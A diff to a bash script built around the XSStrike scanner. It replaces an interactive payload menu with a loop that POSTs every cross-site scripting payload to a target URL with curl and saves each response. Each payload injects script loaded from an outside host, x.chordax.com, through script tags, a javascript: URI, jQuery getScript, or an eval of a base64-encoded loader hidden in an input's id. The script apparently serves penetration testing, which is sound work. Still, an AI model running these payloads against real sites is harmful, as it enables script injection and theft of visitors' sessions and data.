@@ -23,45 +23,31 @@ if [ "$mode" -eq 1 ]; then
 # Use Slow Fuzz mode
 elif [ "$mode" -eq 2 ]; then
     python3 xsstrike.py -u "$targetURL" --fuzzer
-
 fi
 
-# Prompt user to test individual payloads
-echo "Payloads:"
-echo "1. Basic Tag: \"><script src=\"https://x.chordax.com\"></script>"
-echo "2. JS (URI): javascript:eval('var a=document.createElement(\"script\");a.src=\"https://x.chordax.com\";document.body.appendChild(a)')"
-echo "3. HTML5: \"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLmNob3JkYXguY29tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>"
-echo "4. Iframe: \"><iframe srcdoc=\"...\">"
-echo "5. jQuery: <script>$.getScript(\"https://x.chordax.com\")</script>"
+# Payload options
+payloads=(
+    '"><script src="https://x.chordax.com"></script>'
+    'javascript:eval("var a=document.createElement(\'script\');a.src=\'https://x.chordax.com\';document.body.appendChild(a)")'
+    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC5jaG9yZGF4LmNvbSI7ZG9jdW1lbnQuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
+    '"><iframe srcdoc="...">'
+    '<script>$.getScript("https://x.chordax.com")</script>'
+)
 
-read -p "Choose a payload to test (1-5): " payloadOption
+# Output file for curl commands
+curlCommandsFile="curl_commands.txt"
 
-case $payloadOption in
-    1)
-        payload='\"><script src="https://x.chordax.com"></script>'
-        ;;
-    2)
-        payload='javascript:eval('"'"'var a=document.createElement("script");a.src="https://x.chordax.com";document.body.appendChild(a)'"'"')'
-        ;;
-    3)
-        payload='\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLmNob3JkYXguY29tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>'
-        ;;
-    4)
-        payload='\"><iframe srcdoc="...">'
-        ;;
-    5)
-        payload='<script>$.getScript("https://x.chordax.com")</script>'
-        ;;
-    *)
-        echo "Invalid option. Exiting."
-        exit 1
-        ;;
-esac
+# Loop through each payload option
+for ((i=0; i<${#payloads[@]}; i++)); do
+    payload="${payloads[$i]}"
+    
+    # Output the individual curl command to the file
+    echo "curl -X POST -d \"param1=$payload\" \"$targetURL\" > response_payload_$((i+1)).txt" >> "$curlCommandsFile"
 
-# Send custom curl request with the chosen payload
-echo "Sending custom curl request with payload: $payload to $targetURL"
-# Customize the curl request based on your actual request method and parameters
-# Example: curl -X POST -d "param1=$payload" "$targetURL"
-# Modify the above line based on your actual request method and parameters
+    # Send custom curl request with the current payload and save the response to a text file
+    echo "Sending custom curl request with payload $((i+1)): $payload to $targetURL"
+    curl -X POST -d "param1=$payload" "$targetURL" > "response_payload_$((i+1)).txt"
+    echo "Response saved to response_payload_$((i+1)).txt"
+done
 
-curl -X POST -d "param1=$payload" "$targetURL" > scan.txt
+echo "Curl commands saved to $curlCommandsFile"
